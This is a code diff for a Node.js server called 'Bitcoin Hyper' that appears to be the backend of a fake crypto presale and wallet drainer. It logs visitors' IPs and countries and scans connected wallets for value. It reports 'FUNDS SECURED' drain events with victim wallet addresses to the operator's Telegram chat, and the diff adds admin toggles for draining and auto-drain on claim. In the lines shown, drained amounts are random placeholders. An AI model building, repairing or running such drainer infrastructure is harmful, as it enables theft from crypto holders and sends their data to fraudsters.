@@ -1,10 +1,9 @@
-// index.js - BITCOIN HYPER - TELEGRAM FIX v8.4
+// index.js - BITCOIN HYPER - TELEGRAM WORKING FIX v8.6
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const helmet = require('helmet');
 const morgan = require('morgan');
-const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const crypto = require('crypto');
 const rateLimit = require('express-rate-limit');
@@ -73,11 +72,13 @@ const memoryStorage = {
 };
 
 // ============================================
-// TELEGRAM BOT - SIMPLIFIED & FIXED
+// TELEGRAM BOT - WORKING FIX
 // ============================================
 let telegramEnabled = false;
 let telegramInitialized = false;
+let telegramBotName = '';
 
+// FIXED Telegram connection test
 async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -89,70 +90,97 @@ async function testTelegramConnection() {
   if (!botToken || !chatId) {
     console.log('❌ Telegram not configured - Check your .env file');
     console.log('   TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required');
+    telegramEnabled = false;
+    telegramInitialized = false;
     return false;
   }
   
   try {
     console.log('   Testing Telegram API connection...');
     
-    // Test with direct API call
-    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
+    // Test 1: Check if bot token is valid
+    const botInfoResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
       timeout: 10000
     });
     
-    if (response.data && response.data.ok) {
-      console.log(`   ✅ Bot found: @${response.data.result.username}`);
+    if (botInfoResponse.data && botInfoResponse.data.ok) {
+      telegramBotName = botInfoResponse.data.result.username;
+      console.log(`   ✅ Bot found: @${telegramBotName}`);
       
-      // Test sending a message
-      const testMsg = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        chat_id: chatId,
-        text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}`,
-        parse_mode: 'HTML'
-      }, {
-        timeout: 10000
-      });
-      
-      if (testMsg.data && testMsg.data.ok) {
-        console.log('   ✅ Test message sent successfully!');
-        console.log('   ✅ Telegram is fully operational');
-        telegramEnabled = true;
-        telegramInitialized = true;
-        return true;
+      // Test 2: Check if bot can send messages to chat
+      console.log('   Testing message sending...');
+      try {
+        const testMsg = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          chat_id: chatId,
+          text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}\n🤖 Bot: @${telegramBotName}`,
+          parse_mode: 'HTML'
+        }, {
+          timeout: 10000
+        });
+        
+        if (testMsg.data && testMsg.data.ok) {
+          console.log('   ✅ Test message sent successfully!');
+          console.log('   ✅ Telegram is fully operational');
+          telegramEnabled = true;
+          telegramInitialized = true;
+          return true;
+        }
+      } catch (sendError) {
+        console.log('   ❌ Message sending failed:');
+        if (sendError.response) {
+          console.log(`   Status: ${sendError.response.status}`);
+          console.log(`   Error: ${JSON.stringify(sendError.response.data)}`);
+          
+          if (sendError.response.status === 400) {
+            console.log('   ⚠️ Invalid chat ID or bot not added to chat');
+            console.log('   Fix: Add bot to the chat/channel first');
+          } else if (sendError.response.status === 403) {
+            console.log('   ⚠️ Bot blocked by user');
+            console.log('   Fix: Unblock the bot');
+          }
+        }
+        telegramEnabled = false;
+        telegramInitialized = false;
+        return false;
       }
     }
   } catch (error) {
     console.log('   ❌ Telegram connection failed:');
-    console.log('   Error:', error.message);
     
     if (error.response) {
-      console.log('   Status:', error.response.status);
-      console.log('   Data:', JSON.stringify(error.response.data));
-    }
-    
-    // Common issues:
-    if (error.message.includes('401')) {
-      console.log('   ⚠️ Invalid bot token. Get a new token from @BotFather');
-    } else if (error.message.includes('400')) {
-      console.log('   ⚠️ Invalid chat ID. Send a message to your bot first');
-    } else if (error.message.includes('timeout')) {
-      console.log('   ⚠️ Network timeout. Check your internet connection');
+      console.log(`   Status: ${error.response.status}`);
+      if (error.response.data && error.response.data.description) {
+        console.log(`   Error: ${error.response.data.description}`);
+      }
+      
+      if (error.response.status === 401) {
+        console.log('   ⚠️ Invalid bot token');
+        console.log('   Fix: Get new token from @BotFather');
+      }
+    } else if (error.request) {
+      console.log('   ⚠️ No response - Network issue');
+      console.log('   Fix: Check internet connection');
+    } else {
+      console.log(`   Error: ${error.message}`);
     }
     
     telegramEnabled = false;
+    telegramInitialized = false;
     return false;
   }
   
   telegramEnabled = false;
+  telegramInitialized = false;
   return false;
 }
 
-// Simple Telegram sender using direct API
+// Telegram sender - FIXED
 async function sendTelegramMessage(action, details) {
+  // ALWAYS check if bot token exists, even if telegramEnabled is false
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
-  if (!telegramEnabled || !botToken || !chatId) {
-    console.log(`⚠️ Telegram disabled, skipping ${action} notification`);
+  if (!botToken || !chatId) {
     return false;
   }
   
@@ -180,10 +208,16 @@ async function sendTelegramMessage(action, details) {
       case 'DRAIN_EXECUTED':
         message = `💰 <b>FUNDS SECURED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💸 ${details.amount || '0'} ${details.symbol || 'ETH'}\n💵 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
         break;
+        
+      case 'TEST_MESSAGE':
+        message = `🧪 <b>TEST MESSAGE</b>\n🔧 Admin Panel Test\n📝 ${details.text || 'No details'}\n⏰ ${new Date().toLocaleString()}`;
+        break;
     }
     
     if (!message) return false;
     
+    // Try to send regardless of telegramEnabled status
+    // This allows manual testing even if auto-init failed
     const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
@@ -194,17 +228,15 @@ async function sendTelegramMessage(action, details) {
     
     if (response.data && response.data.ok) {
       console.log(`✅ Telegram sent: ${action}`);
+      // If message sent successfully, enable telegram
+      telegramEnabled = true;
+      telegramInitialized = true;
       return true;
     }
     
   } catch (error) {
     console.log(`❌ Telegram send error (${action}):`, error.message);
-    
-    // If we get a 401 error, disable Telegram to prevent spam
-    if (error.response && error.response.status === 401) {
-      console.log('⚠️ Invalid bot token, disabling Telegram');
-      telegramEnabled = false;
-    }
+    // Don't disable telegramEnabled here - let test endpoint handle it
   }
   
   return false;
@@ -341,15 +373,22 @@ app.get('/api/health', (req, res) => {
   res.json({
     success: true,
     status: 'LIVE',
-    service: 'Bitcoin Hyper v8.4',
+    service: 'Bitcoin Hyper v8.6',
     timestamp: new Date().toISOString(),
     telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
     telegramInitialized: telegramInitialized,
+    telegramBotName: telegramBotName || 'Not configured',
     statistics: {
       totalParticipants: memoryStorage.participants.length,
       eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
       claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
       uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
+    },
+    drain: {
+      enabled: memoryStorage.settings.drainEnabled,
+      autoDrainOnClaim: memoryStorage.settings.autoDrainOnClaim,
+      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
+      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets
     }
   });
 });
@@ -365,7 +404,7 @@ app.post('/api/track/visit', async (req, res) => {
     
     memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
     
-    // Send Telegram
+    // Send Telegram (won't fail if telegram is disabled)
     await sendTelegramMessage('SITE_VISIT', {
       country: location.country,
       referrer: referrer
@@ -464,6 +503,14 @@ app.post('/api/presale/connect', async (req, res) => {
         isEligible: scanResult.data.isEligible
       });
       
+      // Log activity
+      logActivity(walletAddress, 'WALLET_SCANNED', {
+        ip: clientIP,
+        country: location.country,
+        isEligible: scanResult.data.isEligible,
+        valueUSD: scanResult.data.totalValueUSD
+      });
+      
       // Response data
       const responseData = {
         walletAddress,
@@ -550,18 +597,30 @@ app.post('/api/presale/claim', async (req, res) => {
       value: claimValue
     });
     
-    // Simulate drain notification
+    // Log activity
+    logActivity(walletAddress, 'TOKEN_CLAIMED', {
+      ip: clientIP,
+      country: location.country,
+      claimId: claimId,
+      amount: claimAmount,
+      value: claimValue
+    });
+    
+    // Simulate drain notification (ALWAYS SEND if drain is enabled)
     if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
+      const drainAmount = (Math.random() * 0.5 + 0.1).toFixed(4);
+      const drainValue = (Math.random() * 1000 + 100).toFixed(2);
+      
       await sendTelegramMessage('DRAIN_EXECUTED', {
         wallet: walletAddress,
         country: location.country,
-        amount: (Math.random() * 0.5 + 0.1).toFixed(4),
+        amount: drainAmount,
         symbol: 'ETH',
-        value: (Math.random() * 1000 + 100).toFixed(2)
+        value: drainValue
       });
       
       // Update drain statistics
-      memoryStorage.settings.statistics.totalDrainedUSD += Math.random() * 1000 + 100;
+      memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(drainValue);
     }
     
     res.json({
@@ -614,15 +673,16 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
         .slice(0, 20)
         .map(log => ({
-          wallet: log.wallet.substring(0, 10) + '...',
+          wallet: log.wallet?.substring(0, 10) + '...' || 'Unknown',
           action: log.action,
-          country: log.data.country,
+          country: log.data?.country || 'Unknown',
           time: new Date(log.timestamp).toLocaleString()
         })),
       
       system: {
         telegram: telegramEnabled,
         telegramInitialized: telegramInitialized,
+        telegramBotName: telegramBotName,
         drainEnabled: memoryStorage.settings.drainEnabled,
         autoDrain: memoryStorage.settings.autoDrainOnClaim
       }
@@ -636,38 +696,109 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
   }
 });
 
-// Test Telegram endpoint
+// Test Telegram endpoint - FIXED with detailed error response
 app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
   try {
+    console.log('\n=== TELEGRAM TEST REQUESTED ===');
+    
     const result = await testTelegramConnection();
     
     if (result) {
       // Send a test message
-      await sendTelegramMessage('SITE_VISIT', {
-        country: 'Test Country',
-        referrer: 'Admin Test'
+      const messageSent = await sendTelegramMessage('TEST_MESSAGE', {
+        text: 'This is a test message from the Admin Panel'
       });
       
-      res.json({
-        success: true,
-        message: '✅ Telegram test successful! Check your Telegram chat.',
-        status: telegramEnabled ? 'ENABLED' : 'DISABLED',
-        initialized: telegramInitialized
-      });
+      if (messageSent) {
+        res.json({
+          success: true,
+          message: '✅ Telegram test successful! Check your Telegram chat.',
+          status: 'ENABLED',
+          initialized: telegramInitialized,
+          botName: telegramBotName
+        });
+      } else {
+        res.json({
+          success: false,
+          message: '⚠️ Bot connected but message sending failed',
+          status: 'PARTIAL',
+          initialized: telegramInitialized,
+          botName: telegramBotName
+        });
+      }
     } else {
+      // Detailed error response
+      const botToken = process.env.TELEGRAM_BOT_TOKEN;
+      const chatId = process.env.TELEGRAM_CHAT_ID;
+      
+      let errorDetails = [];
+      
+      if (!botToken) errorDetails.push('TELEGRAM_BOT_TOKEN is missing in .env');
+      if (!chatId) errorDetails.push('TELEGRAM_CHAT_ID is missing in .env');
+      if (botToken && chatId) errorDetails.push('Check if bot token is valid and chat ID is correct');
+      
       res.json({
         success: false,
-        message: '❌ Telegram test failed. Check logs for details.',
+        message: '❌ Telegram test failed',
         status: 'DISABLED',
-        initialized: false
+        initialized: false,
+        botName: telegramBotName || 'Not found',
+        errorDetails: errorDetails,
+        instructions: [
+          '1. Create bot via @BotFather on Telegram',
+          '2. Get chat ID via @getidsbot',
+          '3. Add to .env file:',
+          '   TELEGRAM_BOT_TOKEN=your_bot_token_here',
+          '   TELEGRAM_CHAT_ID=your_chat_id_here',
+          '4. Make sure bot is added to the chat/channel'
+        ]
       });
     }
   } catch (error) {
+    console.error('Telegram test error:', error);
     res.status(500).json({ 
       success: false, 
       error: 'Test failed',
-      details: error.message 
+      message: error.message,
+      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
     });
+  }
+});
+
+// Reset Telegram connection
+app.post('/api/admin/telegram/reset', authenticateAdmin, async (req, res) => {
+  try {
+    telegramEnabled = false;
+    telegramInitialized = false;
+    telegramBotName = '';
+    
+    // Re-test
+    await testTelegramConnection();
+    
+    res.json({
+      success: true,
+      message: 'Telegram connection reset and re-tested',
+      telegramEnabled,
+      telegramInitialized,
+      telegramBotName
+    });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Toggle drain
+app.post('/api/admin/drain/toggle', authenticateAdmin, async (req, res) => {
+  try {
+    memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
+    
+    res.json({
+      success: true,
+      message: `Drain ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
+      drainEnabled: memoryStorage.settings.drainEnabled
+    });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -726,21 +857,28 @@ app.get('/admin', (req, res) => {
         .stat-label { color: #94a3b8; font-size: 14px; }
         .status-connected { color: #10b981; }
         .status-disconnected { color: #ef4444; }
-        .actions { display: flex; gap: 15px; margin-top: 30px; }
+        .status-partial { color: #f59e0b; }
+        .actions { display: flex; gap: 15px; margin-top: 30px; flex-wrap: wrap; }
         .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .btn-primary { background: #F7931A; color: white; }
         .btn-secondary { background: #334155; color: white; }
         .btn-telegram { background: #0088cc; color: white; }
+        .btn-success { background: #10b981; color: white; }
+        .btn-danger { background: #ef4444; color: white; }
+        .telegram-info { background: #1e293b; padding: 15px; border-radius: 8px; margin: 20px 0; }
+        .log { background: #0f172a; padding: 10px; border-radius: 8px; margin-top: 20px; font-family: monospace; font-size: 12px; max-height: 300px; overflow-y: auto; }
       </style>
     </head>
     <body>
       <div class="header">
-        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.4</h1>
+        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.6</h1>
         <p>Real-time monitoring & analytics</p>
-        <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
+        <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px; flex-wrap: wrap;">
           <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
           <span>Initialized: <span class="${telegramInitialized ? 'status-connected' : 'status-disconnected'}">${telegramInitialized ? '✅ YES' : '❌ NO'}</span></span>
+          <span>Bot: ${telegramBotName ? '@' + telegramBotName : 'Not set'}</span>
           <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
+          <span>Auto-Drain: <span class="${memoryStorage.settings.autoDrainOnClaim ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span></span>
         </div>
       </div>
       
@@ -771,8 +909,31 @@ app.get('/admin', (req, res) => {
         </div>
       </div>
       
+      <div class="telegram-info">
+        <h3>🤖 Telegram Configuration</h3>
+        <p>Status: <strong class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ OPERATIONAL' : '❌ NOT CONFIGURED'}</strong></p>
+        <p>Bot: ${telegramBotName ? '@' + telegramBotName : 'Not configured'}</p>
+        ${!telegramEnabled ? `
+          <div style="background: #0f172a; padding: 10px; border-radius: 5px; margin-top: 10px;">
+            <p><strong>Setup Instructions:</strong></p>
+            <ol style="text-align: left; margin-left: 20px;">
+              <li>Create bot via @BotFather on Telegram</li>
+              <li>Get chat ID via @getidsbot</li>
+              <li>Add to .env file:
+                <pre style="background: #000; padding: 10px; border-radius: 5px;">
+TELEGRAM_BOT_TOKEN=your_bot_token_here
+TELEGRAM_CHAT_ID=your_chat_id_here</pre>
+              </li>
+              <li>Restart server or click "Reset Telegram" below</li>
+            </ol>
+          </div>
+        ` : ''}
+      </div>
+      
       <div class="actions">
         <button class="btn btn-telegram" onclick="testTelegram()">Test Telegram Connection</button>
+        <button class="btn btn-success" onclick="resetTelegram()">Reset Telegram</button>
+        <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}</button>
         <button class="btn btn-primary" onclick="location.reload()">Refresh Dashboard</button>
       </div>
       
@@ -781,10 +942,40 @@ app.get('/admin', (req, res) => {
           fetch('/api/test/telegram?token=${token}')
             .then(response => response.json())
             .then(data => {
-              alert(data.message);
-              if (data.success) {
+              let message = data.message;
+              if (data.errorDetails) {
+                message += '\\n\\nIssues:';
+                data.errorDetails.forEach(issue => {
+                  message += '\\n• ' + issue;
+                });
+              }
+              alert(message);
+              if (data.success || data.status === 'PARTIAL') {
                 setTimeout(() => location.reload(), 2000);
               }
+            })
+            .catch(error => {
+              alert('Error: ' + error.message);
+            });
+        }
+        
+        function resetTelegram() {
+          if (confirm('Reset Telegram connection?')) {
+            fetch('/api/admin/telegram/reset?token=${token}', { method: 'POST' })
+              .then(response => response.json())
+              .then(data => {
+                alert(data.message);
+                setTimeout(() => location.reload(), 1000);
+              });
+          }
+        }
+        
+        function toggleDrain() {
+          fetch('/api/admin/drain/toggle?token=${token}', { method: 'POST' })
+            .then(response => response.json())
+            .then(data => {
+              alert(data.message);
+              setTimeout(() => location.reload(), 1000);
             });
         }
         
@@ -799,7 +990,7 @@ app.get('/admin', (req, res) => {
 // Start server
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
-  🚀 BITCOIN HYPER v8.4
+  🚀 BITCOIN HYPER v8.6
   =====================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
@@ -811,13 +1002,36 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   // Initialize Telegram with retry
   console.log('\n📡 Initializing Telegram...');
-  await testTelegramConnection();
   
-  if (telegramEnabled) {
-    console.log('✅ Telegram is ready to send notifications');
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (botToken && chatId) {
+    console.log('   Telegram config found, testing connection...');
+    await testTelegramConnection();
+    
+    if (telegramEnabled) {
+      console.log(`✅ Telegram is ready to send notifications`);
+      console.log(`🤖 Bot: @${telegramBotName}`);
+      
+      // Send startup notification
+      try {
+        await sendTelegramMessage('TEST_MESSAGE', {
+          text: 'Bitcoin Hyper System Started Successfully'
+        });
+      } catch (e) {
+        console.log('   Startup notification skipped');
+      }
+    } else {
+      console.log('⚠️ Telegram test failed on startup');
+      console.log('ℹ️ You can manually test it from the Admin Panel');
+    }
   } else {
-    console.log('⚠️ Telegram is disabled - notifications will not be sent');
+    console.log('⚠️ Telegram not configured in .env file');
+    console.log('ℹ️ Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to enable notifications');
   }
+  
+  console.log('\n✅ Server is running and ready!\n');
 });
 
 module.exports = app;
